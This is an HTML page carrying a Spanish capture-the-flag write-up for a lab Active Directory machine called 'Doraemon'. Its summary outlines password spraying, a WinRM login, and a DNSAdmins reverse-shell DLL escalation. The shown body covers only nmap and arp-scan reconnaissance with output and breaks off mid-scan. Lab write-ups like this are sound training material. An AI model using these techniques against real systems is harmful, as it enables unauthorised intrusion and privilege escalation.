@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Doraemon - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-doraemon/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Doraemon - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-doraemon/doraemon.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-sarxixas/">
+          <span class="side-post-card-title">Sarxixas</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-jaulaCon2025/">
+          <span class="side-post-card-title">JaulaCon2025</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Doraemon</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-findMe/">
+          <span class="side-post-card-title">Find Me</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-aceituno/">
+          <span class="side-post-card-title">Aceituno</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Doraemon - TheHackerLabs</h1>
+    <div class="post-meta">9 April 2025 · 22 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-doraemon/doraemon.jpg" alt="Doraemon - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es Active Directory, vemos que es posible ver los recursos compartidos con el usuario guest. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de Doraemon. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar Password Spraying con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al servicio WinRM, lo que nos permite loguearnos con la herramienta Evil-WinRM. Una vez dentro, utilizamos winPEASx64.exe para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar Password Spraying y lo encontramos, siendo que también pertenece al servicio WinRM. Logueándonos con el nuevo usuario, descubrimos que pertenece al grupo DNSAdmins, lo que nos permite crear y cargar una Reverse Shell almacenada en un archivo DLL, con tal de infectar el servicio DNS y nos permita escalar privilegios en otra sesión que capturara la Reverse Shell.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>arp-scan</code></li><li><code>crackmapexec</code></li><li><code>smbmap</code></li><li><code>kerbrute_linux_amd64</code></li><li><code>impacket-GetNPUsers</code></li><li><code>evil-winrm</code></li><li><code>winPEASx64.exe</code></li><li><code>whoami</code></li><li><code>msfvenom</code></li><li><code>impacket-smbserver</code></li><li><code>rlwrap</code></li><li><code>nc</code></li><li><code>dnscmd.exe</code></li><li><code>sc.exe</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+        <li><a href="#Kerberos">Enumeración de Usuarios de Servicio Kerberos</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PasswordS">Aplicando Password Spraying con crackmapexec</a></li>
+        <li><a href="#Doraemon">Enumeración de Máquina Víctima con winPEASx64.exe</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#dnsGroup">Abusando de Grupo DNSAdmins para Cargar Reverse Shell en un Archivo DLL y Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+        <li><a href="#Kerberos">Enumeración de Usuarios de Servicio Kerberos</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PasswordS">Aplicando Password Spraying con crackmapexec</a></li>
+        <li><a href="#Doraemon">Enumeración de Máquina Víctima con winPEASx64.exe</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#dnsGroup">Abusando de Grupo DNSAdmins para Cargar Reverse Shell en un Archivo DLL y Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <p align="center">
+<img src="/assets/images/THL-writeup-doraemon/Captura3.png">
+</p>
+<hr>
+<p>Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es <strong>Active Directory</strong>, vemos que es posible ver los recursos compartidos con el <strong>usuario guest</strong>. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de <strong>Doraemon</strong>. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar <strong>Password Spraying</strong> con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al <strong>servicio WinRM</strong>, lo que nos permite loguearnos con la herramienta <strong>Evil-WinRM</strong>. Una vez dentro, utilizamos <strong>winPEASx64.exe</strong> para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar <strong>Password Spraying</strong> y lo encontramos, siendo que también pertenece al <strong>servicio WinRM</strong>. Logueándonos con el nuevo usuario, descubrimos que pertenece al <strong>grupo DNSAdmins</strong>, lo que nos permite crear y cargar una <strong>Reverse Shell</strong> almacenada en un <strong>archivo DLL</strong>, con tal de infectar el <strong>servicio DNS</strong> y nos permita escalar privilegios en otra sesión que capturara la <strong>Reverse Shell</strong>.</p>
+<h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.10.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-09 14:06 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0040s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> hosts up<span style="color:#f92672">)</span> scanned in 2.47 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.10.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.10.5	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.108 seconds <span style="color:#f92672">(</span>121.44 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es: <code>192.168.10.5</code>.</p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.10.5
+</span></span><span style="display:flex;"><span>PING 192.168.10.5 <span style="color:#f92672">(</span>192.168.10.5<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.5: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.09 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.5: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.10 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.5: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.903 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.5: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.919 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.10.5 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3181ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.903/1.003/1.104/0.093 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.10.5 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-09 14:08 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 14:08
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.5 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 14:08, 0.08s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 14:08
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.5 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49665/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49671/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 47001/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49668/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49673/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49670/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49666/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49708/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49686/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49676/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 49669/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 192.168.10.5
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 14:09, 21.82s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.5
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00099s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-04-09 14:08:55 CST <span style="color:#66d9ef">for</span> 21s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65510</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49670/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49671/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49673/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49676/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49686/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49708/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.07 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">80225</span> <span style="color:#f92672">(</span>3.530MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65537</span> <span style="color:#f92672">(</span>2.622MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Son bastantes puertos abiertos, y puedo ver algunos conocidos que nos indican que estamos contra una <strong>Active Directory</strong>, como el <strong>puerto 88</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49673,49676,49686,49708 192.168.10.5 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-04-09 14:10 CST
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00085s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain       Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-04-09 12:10:40Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: DORAEMON.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: DORAEMON<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: DORAEMON.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
